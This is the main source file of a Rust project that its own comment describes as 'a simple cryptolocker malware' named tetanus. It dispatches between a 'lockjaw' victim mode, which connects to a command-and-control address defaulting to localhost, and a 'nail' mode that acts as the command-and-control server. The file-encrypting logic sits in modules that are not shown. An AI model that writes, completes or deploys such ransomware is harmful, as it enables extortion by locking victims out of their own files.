// tetanus is a simple cryptolocker malware written in rust
const DBUG: i32 = 1;

mod nail;
mod lockjaw;

extern crate local_ip;
extern crate rand;
extern crate crypto;

use std::io;
use std::env;

#[macro_use]
extern crate clap;
use clap::App;

fn main() {
    let mut lockjaw = "true";   // run as victim
    let mut nail = "false";     // not as c2

    let yaml = load_yaml!("cli.yml");
    let matches = App::from_yaml(yaml).get_matches();

    if let Some(matches) = matches.subcommand_matches("nail") {
        nail = "true";      // run as c2
        lockjaw = "false";  // not as victim
    }

    if DBUG == 1 {
        println!("lockjaw == {}", lockjaw);
        println!("nail == {}", nail);
    }

    // initialize lockjaw module if called with lockjaw param (default mode)
    if lockjaw == "true" {
        let c2 = matches.value_of("c2").unwrap_or("127.0.0.1"); // default to localhost c2 server
        lockjaw::init(String::from(c2));
    }

    // initialize nail module if called with nail param (default)
    if nail == "true" {
        nail::init();
    }
}
